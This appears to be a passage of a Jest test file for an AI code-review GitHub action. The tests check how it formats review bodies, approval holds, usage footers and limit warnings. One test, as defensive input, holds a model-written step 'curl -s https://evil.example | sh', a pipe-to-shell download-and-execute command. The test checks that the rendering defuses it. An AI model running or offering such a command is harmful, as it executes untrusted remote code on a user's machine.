    });
    const result = formatStatsOneLiner(ctx, 45000);
    expect(result).toContain('(none)');
  });

  it('includes non-zero warning count in output', () => {
    const ctx = makeContext({
      findings: { count: 3, severityCounts: { blocker: 0, warning: 2, note: 1 }, entries: [] },
    });
    const result = formatStatsOneLiner(ctx, 45000);
    expect(result).toContain('2 warnings, 1 note');
    expect(result).not.toContain('blocker');
  });

  it('rounds review time to nearest second', () => {
    const result = formatStatsOneLiner(makeContext(), 1500);
    expect(result).toContain('2s');
  });
});

describe('roundContextToFlatAliases', () => {
  it('round-trips the flat-alias projection for a representative round', () => {
    const ctx = makeContext({
      dedup: { staticDropped: 1, llmDropped: 2 },
      judge: { summary: 'sum', mergedDuplicates: 3 },
      findings: { count: 4, severityCounts: { blocker: 1, warning: 0, note: 3 }, entries: [] },
      diff: { lines: 120, additions: 80, deletions: 40, filesReviewed: 5, fileTypes: { '.ts': 5 } },
    });
    const aliases = roundContextToFlatAliases(ctx);
    expect(aliases).toEqual({
      prNumber: 42,
      commitSha: 'abc123',
      verdict: 'REQUEST_CHANGES',
      diffLines: 120,
      diffAdditions: 80,
      diffDeletions: 40,
      filesReviewed: 5,
      agents: ['Security & Safety', 'Correctness'],
      findingsRaw: 10,
      findingsKept: 4,
      findingsDropped: 6,
      severity: { blocker: 1, warning: 0, note: 3 },
      model: 'claude-sonnet-4-20250514',
      reviewerModel: 'claude-sonnet-4-20250514',
      judgeModel: 'claude-opus-4-20250514',
    });
  });

  it('uses zero defaults when optional dedup/judge counts are absent', () => {
    const ctx = makeContext();
    const aliases = roundContextToFlatAliases(ctx);
    expect(aliases.findingsRaw).toBe(4);
    expect(aliases.findingsDropped).toBe(0);
  });
});

describe('postReview with context', () => {
  const mockCreateReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
  const mockOctokit = {
    rest: {
      pulls: {
        createReview: mockCreateReview,
      },
    },
  } as unknown as Parameters<typeof postReview>[0];

  let warningSpy: jest.SpyInstance;

  beforeEach(() => {
    mockCreateReview.mockClear();
    warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    warningSpy.mockClear();
  });

  afterEach(() => {
    warningSpy.mockRestore();
  });

  it('puts the stats and the Manki context in hidden comments by default', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'All good.',
      findings: [],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };
    const ctx = makeContext({
      diff: { lines: 200, additions: 150, deletions: 50, filesReviewed: 8, fileTypes: { '.ts': 8 } },
      reviewers: { agents: ['Security', 'Correctness'] },
      findings: { count: 3, severityCounts: { blocker: 0, warning: 0, note: 3 }, entries: [] },
      verdict: 'APPROVE',
    });

    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, ctx, 60000);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('<!-- manki-stats: 3 findings (3 notes), 200 lines, 60s -->\n<!-- manki-context: ');
    // The only fold is the footer's, so the stats never show as one.
    expect(body.match(/<details>/g)).toHaveLength(1);
    expect(body.endsWith(TRAILING_MARKERS)).toBe(true);
    // The footer closes the body as a fold with the commit, round, lines, time and the models the routed group ran.
    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, { ...ctx, routing: { ...ctx.routing!, reviewers: [{ name: 'deep', model: 'gemini-3-pro', provider: 'gemini' }] } }, 60000);
    expect(mockCreateReview.mock.calls.at(-1)![0].body).toContain('- Found by `gemini-3-pro`, judged by ');
    expect(body.slice(0, -TRAILING_MARKERS.length)).toMatch(/-->\n\n<details>\n<summary>About this review<\/summary>\n\n- Reviewed \[`abc`\]\([^)]+\), round \d+\n- 200 changed lines read in 1m 0s\n- Found by `claude-sonnet-4-20250514`, judged by `[^`]+`\n- \[How Manki reviews\]\([^)]+\)\n\n<\/details>$/);
    expect(body).not.toContain('\u{1F4CA}');
    expect(body).toContain('"reviewer":"claude-sonnet-4-20250514"');

    // A round with calls adds its tokens and cost to the same fold, and leaves the cost out when no call was priced.
    const usage = { calls: 4, failedCalls: 1, inputTokens: 1_234_567, cacheReadTokens: 980_400, outputTokens: 23_400, estimatedCostUsd: 1.578, unpricedCalls: 0 };
    const footerFor = async (roundUsage: RoundContext['usage']): Promise<string> => {
      await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, { ...ctx, usage: roundUsage }, 60000);
      const posted = mockCreateReview.mock.calls.at(-1)![0].body as string;
      expect(posted.match(/<details>/g)).toHaveLength(1);
      return posted.slice(posted.lastIndexOf('<details>'));
    };
    expect(await footerFor(usage)).toContain('`claude-opus-4-20250514`\n- Tokens: 1.2M in (980k from cache) · 23k out · about $1.58 at API prices\n- [How Manki reviews]');
    expect(await footerFor({ ...usage, unpricedCalls: 1 })).toContain('- Tokens: 1.2M in (980k from cache) · 23k out · about $1.58 at API prices, partly priced\n');
    expect(await footerFor({ ...usage, unpricedCalls: 3, estimatedCostUsd: 0 })).toContain('- Tokens: 1.2M in (980k from cache) · 23k out\n');
    expect(await footerFor({ ...usage, inputTokens: 999_600, cacheReadTokens: 0, outputTokens: 640, estimatedCostUsd: 0.004 })).toContain('- Tokens: 1.0M in · 640 out · under $0.01 at API prices\n');
    expect(await footerFor({ ...usage, calls: 0, failedCalls: 0 })).not.toContain('Tokens:');
  });

  it('omits stats section when context not provided', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'All good.',
      findings: [],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).not.toContain('manki-stats');
    expect(body).not.toContain('Manki context');
  });

  it('keeps a record that would not fit as plain JSON whole, compressed in the same review', async () => {
    const result: ReviewResult = {
      verdict: 'COMMENT', summary: 'word '.repeat(4000), findings: [],
      highlights: [], reviewComplete: true, agentNames: [],
    };
    const entries: FindingFingerprintEntry[] = Array.from({ length: 1000 }, (_, i) => ({
      fingerprint: { file: `src/file-${i}.ts`, lineStart: i, lineEnd: i, slug: `slug-${'token-'.repeat(16)}${i}` },
      severity: 'note',
    }));
    const ctx = makeContext({
      judge: { summary: 'a'.repeat(65000) },
      findings: { count: entries.length, severityCounts: { note: 1000 }, entries },
    });

    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, ctx, 1000);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body.length).toBeLessThanOrEqual(60000 + 600);
    expect(body).not.toContain('<!-- manki-context: ');
    expect(body).toContain('word word');
    expect(body).not.toContain('*(Review body truncated)*');
    const { records } = extractReviewRecords(body);
    expect(records).toHaveLength(1);
    expect(JSON.parse(records[0])).toEqual({ ...ctx, output: { bodyLength: expect.any(Number), commentLengths: [] } });
  });

  it('posts a record too large even compressed without its bulky diagnostics, and fails only when the rest is too large too', async () => {
    const result: ReviewResult = {
      verdict: 'COMMENT', summary: 'Many findings.', findings: [],
      highlights: [], reviewComplete: true, agentNames: [],
    };
    const infoSpy = jest.spyOn(core, 'info').mockImplementation(() => {});
    const noise = () => randomBytes(100).toString('hex');
    const entries: FindingFingerprintEntry[] = [{ fingerprint: { file: 'src/a.ts', lineStart: 1, lineEnd: 1, slug: 'kept' }, severity: 'warning' }];
    const usesOutsideDiff = {
      symbols: [{ name: 'parse_header', declared: 'src/parse.py:4', uses: ['src/read.py:9', 'cmd/main.go:30'] }],
      types: ['src/model.ts:12: interface Header { size: number; flags: number }'],
    };
    const ctx = makeContext({
      findings: { count: 1, severityCounts: { warning: 1 }, entries },
      reviewers: {
        agents: ['Correctness'],
        rawFindings: Array.from({ length: 600 }, (_, i) => ({
          title: `Finding ${i}`, file: `src/${i}.ts`, line: i, severity: 'note' as const, reviewers: ['Correctness'], description: noise(),
          suggestedFix: noise(), evidence: { checks: [noise()], proof: [`src/${i}.ts:${i}`] },
        })),
      },
      judge: { summary: 'Fine.', dropped: [{ title: 'Dropped', file: 'src/a.ts', line: 1, reviewers: ['Correctness'] }] },
      usesOutsideDiff,
    });

    // The raw findings and the uses outside the diff stay in short form, so a missed defect can still be traced.
    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, ctx, 1000);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('Many findings.');
    const [record] = extractReviewRecords(body).records.map(r => JSON.parse(r) as RoundContext);
    expect(record.meta.omitted).toEqual(['judge.dropped']);
    expect(record.meta.compacted).toEqual(['reviewers.rawFindings', 'usesOutsideDiff']);
    expect(record.reviewers.rawFindings).toHaveLength(600);
    expect(record.reviewers.rawFindings?.[7]).toEqual({ title: 'Finding 7', file: 'src/7.ts', line: 7, severity: 'note', reviewers: ['Correctness'] });
    expect(record.usesOutsideDiff).toEqual({ symbols: usesOutsideDiff.symbols, types: ['src/model.ts:12'] });
    expect(record.judge.dropped).toBeUndefined();
    expect(record.findings.entries).toEqual(entries);
    expect(warningSpy).toHaveBeenCalledWith(expect.stringContaining('without per-file and per-finding diagnostics'));

    // When even the short form does not fit, both are left out too.
    const noisy = makeContext({
      findings: { count: 1, severityCounts: { warning: 1 }, entries },
      reviewers: { agents: ['Correctness'], rawFindings: Array.from({ length: 600 }, (_, i) => ({ title: noise(), file: `src/${i}.ts`, line: i, severity: 'note' as const, reviewers: ['Correctness'], description: noise() })) },
      usesOutsideDiff,
    });
    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, noisy, 1000);
    const [dropped] = extractReviewRecords(mockCreateReview.mock.calls[1][0].body as string).records.map(r => JSON.parse(r) as RoundContext);
    expect(dropped.meta.omitted).toEqual(['reviewers.rawFindings', 'usesOutsideDiff']);
    expect(dropped.meta.compacted).toBeUndefined();
    expect(dropped.reviewers.rawFindings).toBeUndefined();
    expect(dropped.usesOutsideDiff).toBeUndefined();
    expect(dropped.findings.entries).toEqual(entries);

    const huge = makeContext({
      findings: { count: 600, severityCounts: { note: 600 }, entries: Array.from({ length: 600 }, (_, i) => ({ fingerprint: { file: `src/${i}.ts`, lineStart: i, lineEnd: i, slug: noise() }, severity: 'note' as const, title: noise() })) },
    });
    await expect(postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, huge, 1000)).rejects.toThrow('even without its diagnostics');
    infoSpy.mockRestore();
  });

  it('shows 0s for review time when reviewTimeMs is omitted', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE', summary: '', findings: [],
      highlights: [], reviewComplete: true, agentNames: [],
    };
    await postReview(mockOctokit, 'owner', 'repo', 99, 'abc', result, undefined, makeContext());
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('0s');
  });
});

describe('postReview body lead', () => {
  const mockCreateReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
  const mockGet = jest.fn().mockResolvedValue({ data: { mergeable: true, mergeable_state: 'clean', base: { ref: 'main' } } });
  const mockOctokit = {
    rest: {
      pulls: {
        createReview: mockCreateReview,
        get: mockGet,
      },
    },
  } as unknown as Parameters<typeof postReview>[0];

  const diff: ParsedDiff = {
    files: [{ path: 'src/a.ts', changeType: 'modified', hunks: [{ oldStart: 1, oldLines: 30, newStart: 1, newLines: 30, content: '' }] }],
    totalAdditions: 30,
    totalDeletions: 0,
  };

  const verdictReport = {
    verdict: 'READY' as const,
    blockers: [],
    summary: 'Nothing blocks.',
    whatThisDoes: 'Adds a cache in front of the API. <script>x</script>',
    whatToTest: { steps: ['Load the page twice. Expect one request.'] },
  };

  const blocker: Finding = {
    severity: 'blocker',
    title: 'The last partial page of results is never returned',
    file: 'src/a.ts',
    line: 5,
    description: '`total / pageSize` rounds down.',
    reviewers: ['Correctness'],
    cell: { row: 'severe', column: 'normal' },
  };

  const ready: ReviewResult = {
    verdict: 'APPROVE',
    outcome: 'READY',
    verdictReport,
    summary: 'All clear.',
    findings: [{ severity: 'note', title: 'Extract helper', file: 'src/a.ts', line: 7, description: 'Duplicated.', reviewers: [] }],
    highlights: [],
    reviewComplete: true,
    agentNames: [],
  };

  async function postedBody(result: ReviewResult, existingThreads: PreviousFinding[] = [], context?: RoundContext, restart?: string): Promise<{ body: string; event: string; approvalHeld: ApprovalHeld }> {
    mockCreateReview.mockClear();
    const { approvalHeld } = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', result, diff, context, context && 1000, { existingThreads, restart });
    return { ...mockCreateReview.mock.calls[0][0] as { body: string; event: string }, approvalHeld };
  }

  function lead(body: string): string {
    expect(body.endsWith(TRAILING_MARKERS)).toBe(true);
    return body.slice(0, -TRAILING_MARKERS.length);
  }

  it('opens a READY review with the verdict line, then what the change does and how to test it', async () => {
    const { body, event, approvalHeld } = await postedBody({ ...ready, findings: [{ ...ready.findings[0], severity: 'warning', tags: ['follow-up'] }] });
    expect(event).toBe('APPROVE');
    expect(approvalHeld).toBe(false);
    // The verdict counts what this round posted as threads. Each thread sits under the review, so the body does not list them.
    expect(lead(body)).toBe([
      '\u2705 **Approved.** 1 warning, which doesn\'t block.',
      '',
      '**What this does:** Adds a cache in front of the API. x',
      '',
      '---',
      '',
      '<details>',
      '<summary>What to test</summary>',
      '',
      '_The review model wrote these steps. Check what a step runs before you follow it._',
      '',
      '1. Load the page twice. Expect one request.',
      '',
      '</details>',
      '',
      aboutFold('[`abcdef1`](https://github.com/owner/repo/commit/abcdef1234)'),
    ].join('\n'));
  });

  it('puts what the change does under the verdict, with its first two sentences, and a rule before the findings', async () => {
    const offDiff: Finding = { severity: 'note', title: 'Rename cache', file: 'src/b.ts', line: 3, description: 'Unclear.', reviewers: [] };
    const { body } = await postedBody({ ...ready, verdictReport: { ...verdictReport, whatThisDoes: 'Adds a cache. It halves requests. It also logs hits.' }, findings: [offDiff] });
    expect(body).toMatch(/^\u2705 \*\*Approved\.\*\* 1 note, which doesn't block\.\n\n\*\*What this does:\*\* Adds a cache\. It halves requests\.\n\n---\n\n<details>\n<summary><b>1 note<\/b> · not blocking<\/summary>\n\n<details>\n<summary>/u);
    // A reader that asked for changes, whose blockers were all lowered, can leave both blank, so neither part shows.
    const { body: blank } = await postedBody({ ...ready, verdictReport: { ...verdictReport, verdict: 'ADDRESS_FIRST', whatThisDoes: ' ', whatToTest: { steps: [] } }, findings: [offDiff] });
    expect(blank).not.toMatch(/What this does|What to test/);
    // Several findings, of one kind or of mixed kinds, read as plural.
    const several = (severities: Finding['severity'][]) => severities.map((severity, i) => ({ ...offDiff, severity, title: `Finding ${i}`, line: 3 + i }));
    for (const [severities, line] of [
      [['note', 'note'], '2 notes, none of which block.'],
    ] as const) {
      const { body: plural } = await postedBody({ ...ready, findings: several([...severities]) });
      expect(plural.split('\n')[0]).toBe(`\u2705 **Approved.** ${line}`);
    }
    // The findings come first, and how to test the change follows them, set apart by a rule.
    expect(body).toMatch(/Create an issue for this <!-- [^\n]+ -->\n\n<\/details>\n\n---\n\n<details>\n<summary>What to test<\/summary>/);
  });

  it('records the length of the body and of each comment it posts', async () => {
    const deferred: Finding = { ...ready.findings[0], severity: 'warning', title: 'Retry never stops', tags: ['follow-up'] };
    const findings: Finding[] = [blocker, deferred, ...ready.findings, { ...deferred, title: 'Restates a thread', threadId: 'T1' }, { ...blocker, title: 'No line', file: '', line: 0 }];
    const entry = (f: Finding): FindingFingerprintEntry => ({ fingerprint: { file: f.file, lineStart: f.line, lineEnd: f.line, slug: f.title }, severity: f.severity });
    const ctx = makeContext({ findings: { count: findings.length, severityCounts: {}, entries: findings.map(entry) } });
    mockCreateReview.mockClear();
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, findings }, diff, ctx, 1000);
    const { body, comments } = mockCreateReview.mock.calls[0][0] as { body: string; comments: Array<{ body: string }> };
    const record = JSON.parse(extractReviewRecords(body).records[0]);
    expect(record.output.commentLengths).toEqual(comments.map(c => c.body.length));
    expect(record.output.commentLengths).toHaveLength(2);
    expect(body.slice(record.output.bodyLength)).toMatch(/^\n\n<!-- manki-stats: /);
    // Each entry says where its finding went: a thread, the body for a note and for a blocker without a line, or an earlier thread.
    expect(record.findings.entries.map((e: FindingFingerprintEntry) => e.posted)).toEqual(['thread', 'thread', 'body', 'earlier_thread', 'body']);
    // A record built from other findings keeps its entries as they are.
    mockCreateReview.mockClear();
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, findings: [blocker] }, diff, ctx, 1000);
    const other = JSON.parse(extractReviewRecords((mockCreateReview.mock.calls[0][0] as { body: string }).body).records[0]);
    expect(other.findings.entries.every((e: FindingFingerprintEntry) => e.posted === undefined)).toBe(true);
  });

  it('records whether an approval was held and why, and no approval on a round that requests changes', async () => {
    const approval = async (result: ReviewResult) => {
      mockCreateReview.mockClear();
      await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', result, diff, makeContext({}), 1000);
      return (JSON.parse(extractReviewRecords((mockCreateReview.mock.calls[0][0] as { body: string }).body).records[0]) as RoundContext).approval;
    };
    expect(await approval(ready)).toEqual({ held: false });
    mockGet.mockResolvedValueOnce({ data: { mergeable: false, mergeable_state: 'dirty', base: { ref: 'main' } } });
    expect(await approval(ready)).toEqual({ held: 'conflict' });
    expect(await approval({ ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', findings: [blocker] })).toBeUndefined();
  });

  it.each([
    ['mergeable is false', { mergeable: false, mergeable_state: 'dirty' }],
    ['the merge state is dirty', { mergeable: null, mergeable_state: 'dirty' }],
  ])('holds the approval of a READY round as a COMMENT with the full body when %s', async (_label, state) => {
    const approved = await postedBody(ready);
    mockGet.mockResolvedValueOnce({ data: { ...state, base: { ref: 'main' } } });
    const { body, event, approvalHeld } = await postedBody(ready);
    expect(event).toBe('COMMENT');
    expect(approvalHeld).toBe('conflict');
    expect(body).toBe(`**Approval held:** this PR conflicts with \`main\`. Rebase it, and Manki reviews the result.\n\n${approved.body}`);
  });

  it('holds the approval of a draft as a COMMENT when the PR cannot be read, and approves another PR then', async () => {
    mockGet.mockRejectedValueOnce(new Error('API down'));
    const held = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', ready, diff, undefined, undefined, { draft: true });
    expect([mockCreateReview.mock.calls.at(-1)![0].event, held.approvalHeld]).toEqual(['COMMENT', 'draft']);
    mockGet.mockRejectedValueOnce(new Error('API down'));
    expect((await postedBody(ready)).event).toBe('APPROVE');
  });

  it('holds the approval of a READY round as a COMMENT when the PR is a draft at posting time, conflicting or not', async () => {
    const approved = await postedBody(ready);
    mockGet.mockResolvedValueOnce({ data: { draft: true, mergeable: false, mergeable_state: 'dirty', base: { ref: 'main' } } });
    const { body, event, approvalHeld } = await postedBody(ready);
    expect([event, approvalHeld]).toEqual(['COMMENT', 'draft']);
    expect(body).toBe(`**Approval held:** this PR is a draft. Mark it ready for review, and Manki reviews it again.\n\n${approved.body}`);
  });

  it('holds the approval of a READY round as a COMMENT when the base branch config or the PR\'s own changed copy did not load, without reading the PR, names a config hold on a request for changes too, and leads a request for changes with why when an earlier record could not be read', async () => {
    const approved = await postedBody(ready);
    mockGet.mockClear();
    for (const [configHold, line] of [
      ['base', '**Approval held:** the config file on the base branch could not be read or does not load, so Manki reviewed with the defaults.'],
      ['head', '**Approval held:** this PR\'s copy of the config file does not load or could not be read. Fix it and push, and Manki reviews the new commit.'],
    ] as const) {
      const { approvalHeld } = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', ready, diff, undefined, undefined, { configHold });
      const { body, event } = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
      expect([event, approvalHeld]).toEqual(['COMMENT', 'config']);
      expect(body.replace('\n\n<!-- manki-held-for-person -->', '')).toBe(`${line}\n\n${approved.body}`);
      expect(body).toContain('<!-- manki-held-for-person -->');
    }
    expect(mockGet).not.toHaveBeenCalled();

    // A round that requests changes over an unread earlier review record says so first, and names the review.
    const url = 'https://github.com/owner/repo/pull/1#pullrequestreview-7';
    // It names no open thread a blocker and quotes the judge's summary as a summary, not as what blocks.
    const open = { file: 'src/a.ts', title: 'Stale cache', fingerprint: 'src/a.ts:3:3:stale-cache', line: 3 };
    const withheld = {
      ...ready, verdict: 'REQUEST_CHANGES' as const, outcome: 'ADDRESS_FIRST' as const, verdictReason: 'prior_unaddressed' as const,
      summary: 'Nothing blocks merge.', verdictTrace: { survivingBlockers: [], unresolvedPriors: [open] },
    };
    // A config hold also stops a later auto-approve, so a round that requests changes names it first.
    const changes = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', withheld, diff, undefined, undefined, { configHold: 'head' });
    const named = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
    expect([named.event, changes.approvalHeld]).toEqual(['REQUEST_CHANGES', false]);
    expect(named.body.startsWith('**Approval held:** this PR\'s copy of the config file does not load or could not be read. Fix it and push, and Manki reviews the new commit.\n\n')).toBe(true);
    expect(named.body).toContain('<!-- manki-held-for-person -->');

    const records = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', withheld, diff, undefined, undefined, { unreadRecords: [url] });
    const held = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
    expect([held.event, records.approvalHeld]).toEqual(['REQUEST_CHANGES', false]);
    expect(held.body.startsWith(`${unreadRecordsLine([url])}\n\n**Summary:** Nothing blocks merge.\n\n---\n\n**Still open from earlier reviews:**\n- \`src/a.ts:3\`: Stale cache`)).toBe(true);
    expect(held.body).not.toMatch(/Changes requested|What blocks|blocker/);
    expect(unreadRecordsLine([url])).toBe(`**Approval withheld:** an earlier review record could not be read ([review 1](${url})), so Manki cannot tell how serious the open threads are and does not approve while one is open. Once a maintainer has checked and resolved them, the next review can approve.`);
    // When the reviews could not even be listed, the line names none.
    expect(unreadRecordsLine([])).toBe('**Approval withheld:** an earlier review record could not be read, so Manki cannot tell how serious the open threads are and does not approve while one is open. Once a maintainer has checked and resolved them, the next review can approve.');
  });

  it('names why memory was skipped and the fix under the lead, and keeps the approval', async () => {
    const approved = await postedBody(ready);
    const memorySkip = 'this repo is private, and the central memory repository keeps only public repos\' memory. Set `memory.repo` to a private memory repo of the same owner, and pass `memory_repo_token`.';
    const { approvalHeld } = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', ready, diff, undefined, undefined, { memorySkip });
    const { body, event } = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
    const [verdict, ...rest] = approved.body.split('\n\n');
    expect([event, approvalHeld]).toEqual(['APPROVE', false]);
    expect(body).toBe([verdict, `**Memory skipped:** ${memorySkip}`, ...rest].join('\n\n'));
  });

  const limitLine = (used: number, window: string, mark: number) =>
    `**Claude subscription has used ${used}% of its ${window} limit**, past the ${mark}% mark. It resets 2026-11-12 14:00 UTC.`;

  it.each<[number[], string[]]>([
    [[69, 12], []],
    [[70, 82], [limitLine(82, '5-hour', 80), limitLine(70, 'weekly', 70)]],
    [[71, 81], [limitLine(81, '5-hour', 80), limitLine(71, 'weekly', 70)]],
    [[72, 73], [limitLine(72, 'weekly', 70)]],
    [[75, 85], []],
    [[83], []],
    [[85, 95], [limitLine(95, '5-hour', 90)]],
    [[90, 97], [limitLine(97, '5-hour', 90), limitLine(90, 'weekly', 90)]],
  ])('puts a red box under the verdict for each account window of %j percent just past 70 or 80%, or at 90% or more', async (used, lines) => {
    const approved = await postedBody(ready);
    const llmCalls = [{ stage: 'judge', attempt: 1, durationMs: 1, costUsd: null, inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0, reasoningTokens: 0,
      limits: used.map((usedPercent, i) => ({ account: 'Claude subscription', window: i === 0 ? 'weekly' : '5-hour', usedPercent, resetsAt: Date.UTC(2026, 10, 12, 14) / 1000 })) }];
    const { approvalHeld } = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, llmCalls }, diff);
    const { body, event } = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
    const [verdict, ...rest] = approved.body.split('\n\n');
    const box = `> [!CAUTION]\n${[...lines, 'Once a limit is used up, reviews on that account stop until it resets.'].map(line => `> ${line}`).join('\n>\n')}`;
    expect([event, approvalHeld]).toEqual(['APPROVE', false]);
    expect(body).toBe(lines.length > 0 ? [verdict, box, ...rest].join('\n\n') : approved.body);
    if (lines.length === 0) return;
    // A request for changes shows the box after its verdict and before what blocks.
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', llmCalls }, diff);
    const blocked = (mockCreateReview.mock.calls.at(-1)![0] as { body: string }).body.split('\n\n');
    expect(blocked.slice(1, 3)).toEqual([box, '**What blocks:** All clear.']);
    // A round without a verdict, such as an incomplete one, shows the box under its summary.
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, verdict: 'COMMENT', outcome: undefined, llmCalls }, diff, undefined, undefined, { noVerdict: true });
    expect((mockCreateReview.mock.calls.at(-1)![0] as { body: string }).body).toMatch(new RegExp(`^All clear\\.\n\n${box.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
  });

  it('holds the approval of a READY round as a COMMENT for a person when a changed file went unread, and marks it so', async () => {
    const approved = await postedBody(ready);
    mockGet.mockClear();
    const skipped = { excluded: [{ path: 'dist/index.js', matchedPattern: 'dist/**' }], binary: [{ path: 'app.jar', header: '' }, { path: 'vendor/lib', header: '', kind: 'submodule' as const }] };
    const { approvalHeld } = await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', ready, diff, undefined, undefined, { skipped });
    const { body, event } = mockCreateReview.mock.calls.at(-1)![0] as { body: string; event: string };
    expect([event, approvalHeld]).toEqual(['COMMENT', 'unread']);
    // The verdict line says the approval is held, and the unread files get their own section.
    expect(body).toMatch(/^\u2705 \*\*Approved, but a person must approve:\*\* no model read 3 of the changed files\.\n\n\*\*What this does:\*\*/u);
    expect(body).toContain('---\n\n### Not read by any model · 3 files\n\nA person needs to look at these before the PR merges.\n\n- `dist/index.js`: matches `dist/**` in `exclude_paths`\n- `app.jar`: no lines to read, such as a binary, a rename, a mode change or an empty file\n- `vendor/lib`: a submodule bump');
    expect(body).toContain(approved.body.split('\n\n').find(p => p.startsWith('**What this does:**'))!);
    expect(body).not.toContain('**Approval held:**');
    expect(body).toContain('<!-- manki-held-for-person -->');
    expect(mockGet).not.toHaveBeenCalled();
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST' }, diff, undefined, undefined, { skipped });
    expect((mockCreateReview.mock.calls.at(-1)![0] as { body: string }).body).toContain('<!-- manki-held-for-person -->');
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', ready, diff, undefined, undefined, { skipped: { excluded: [], binary: [] } });
    expect((mockCreateReview.mock.calls.at(-1)![0] as { event: string; body: string })).toEqual(expect.objectContaining({ event: 'APPROVE', body: expect.not.stringContaining('held-for-person') }));
  });

  it('marks a review that is no verdict after its record, where truncation never reaches', async () => {
    await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', { ...ready, verdict: 'COMMENT', outcome: undefined }, diff, undefined, undefined, { noVerdict: true });
    expect((mockCreateReview.mock.calls.at(-1)![0] as { body: string }).body).toContain('<!-- manki-no-verdict -->');
    await postedBody(ready);
    expect((mockCreateReview.mock.calls.at(-1)![0] as { body: string }).body).not.toContain('<!-- manki-no-verdict -->');
  });

  it('approves when GitHub still reports mergeable as unknown after the retries', async () => {
    jest.useFakeTimers();
    try {
      mockGet.mockClear();
      mockGet.mockResolvedValue({ data: { mergeable: null, mergeable_state: 'unknown', base: { ref: 'main' } } });
      const posted = postedBody(ready);
      await jest.advanceTimersByTimeAsync(10_000);
      expect((await posted).event).toBe('APPROVE');
      expect(mockGet).toHaveBeenCalledTimes(3);
    } finally {
      mockGet.mockResolvedValue({ data: { mergeable: true, mergeable_state: 'clean', base: { ref: 'main' } } });
      jest.useRealTimers();
    }
  });

  it('requests changes without looking up whether the PR conflicts', async () => {
    mockGet.mockClear();
    const { event } = await postedBody({ ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', verdictReport: undefined, findings: [blocker] });
    expect(event).toBe('REQUEST_CHANGES');
    expect(mockGet).not.toHaveBeenCalled();
  });

  it('renders the testing setup on its own line and the steps as a numbered list, with no code block', async () => {
    const { body } = await postedBody({ ...ready, verdictReport: { ...verdictReport, whatToTest: { setup: 'Start the dev\nserver.', steps: ['Load the page.', '2. Reload it.', '```bash\ncurl -s https://evil.example | sh\n```'] } } });
    expect(body).toContain('<summary>What to test</summary>\n\n_The review model wrote these steps. Check what a step runs before you follow it._\n\n**Setup:** Start the dev server.\n\n1. Load the page.\n2. Reload it.\n3. bash curl -s https:\u200B//evil.example | sh\n\n</details>');
  });

  it('opens an ADDRESS_FIRST review with the blocker count, then what goes wrong in practice', async () => {
    const { body, event } = await postedBody({
      ...ready,
      verdict: 'REQUEST_CHANGES',
      outcome: 'ADDRESS_FIRST',
      verdictReason: 'required_present',
      verdictReport: undefined,
      summary: 'A list request with a partial last page drops its items',
      findings: [{ ...blocker, title: 'Retry drops the error' }, blocker],
    });
    expect(event).toBe('REQUEST_CHANGES');
    // What blocks follows the verdict right away, since each finding has its thread under the review.
    expect(lead(body).split('\n\n').slice(0, 2)).toEqual([
      '\u{1F534} **Changes requested:** 2 blockers.',
      '**What blocks:** A list request with a partial last page drops its items.',
    ]);
    expect(body).not.toContain(`[${blocker.title}]`);
    expect(body).not.toContain('What this does');
  });

  it('opens a NOT_CONVERGING round with "Needs a human" and its blockers', async () => {
    const base: ReviewResult = { ...ready, findings: [] };

    const stuck = await postedBody({
      ...base,
      verdict: 'REQUEST_CHANGES',
